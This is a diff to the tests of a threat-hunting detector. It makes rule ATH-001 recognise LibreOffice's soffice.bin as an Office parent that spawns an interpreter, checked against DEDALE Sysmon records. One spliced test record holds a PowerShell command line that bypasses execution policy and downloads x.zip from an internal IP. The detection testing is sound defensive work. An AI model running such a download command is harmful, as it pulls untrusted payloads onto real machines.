@@ -150,8 +150,10 @@ def test_spliced_office_spawn_fires_through_the_adapter(tmp_path, dedale_sysmon1
     assert {"ATH-001", "ATH-002"} <= fired
 
 
-@pytest.mark.xfail(strict=True, reason="M15-5: LibreOffice (soffice.bin) opened the DEDALE macro document and is not an Office application to ATH-001")
-def test_target_libreoffice_spawning_an_interpreter_is_an_office_spawn(tmp_path, dedale_sysmon1_template) -> None:
+def test_libreoffice_spawning_an_interpreter_is_an_office_spawn(tmp_path, dedale_sysmon1_template) -> None:
+    """M15-5, fixed: on DEDALE's attack day the lure was opened by LibreOffice, whose
+    ``soffice.bin`` is the process that spawns, and ATH-001 did not know the name. The
+    spliced spawn is shaped like the corpus's own ``soffice.exe -> soffice.bin`` records."""
     spliced = _dedale_record(
         dedale_sysmon1_template, name="powershell.exe", executable=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         command_line="powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://172.19.1.1/x.zip -OutFile C:\\Users\\client2\\AppData\\Roaming\\x.zip",
@@ -159,13 +161,18 @@ def test_target_libreoffice_spawning_an_interpreter_is_an_office_spawn(tmp_path,
     )
     (tmp_path / "boot.jsonl").write_text(
         (DEDALE / "client2_2024-12-25_boot.jsonl").read_text(encoding="utf-8") + json.dumps(spliced) + "\n", encoding="utf-8")
-    fired = {f.rule_id for f in run_hunt(_telemetry(WinlogbeatSource(tmp_path).load())).findings}
-    assert "ATH-001" in fired
+    findings = run_hunt(_telemetry(WinlogbeatSource(tmp_path).load())).findings
+    office = [f for f in findings if f.rule_id == "ATH-001"]
+    assert len(office) == 1
+    assert office[0].metadata["parent_process"] == "soffice.bin"
+    # The corpus's own LibreOffice launch (soffice.exe -> soffice.bin) is not a spawn.
+    assert all(f.metadata["child_process"] == "powershell.exe" for f in office)
 
 
-@pytest.mark.xfail(strict=True, reason="M15-5: OFFICE_APPLICATIONS has no LibreOffice entry (DEDALE D15)")
-def test_target_office_application_vocabulary_includes_libreoffice() -> None:
-    assert {"soffice.bin", "soffice.exe"} & set(OFFICE_APPLICATIONS)
+def test_office_application_vocabulary_includes_libreoffice() -> None:
+    """External truth for OFFICE_APPLICATIONS: both process names LibreOffice uses on
+    the captured DEDALE records (``soffice.exe`` launcher, ``soffice.bin`` worker)."""
+    assert {"soffice.bin", "soffice.exe"} <= set(OFFICE_APPLICATIONS)
 
 
 # ======================================================================================
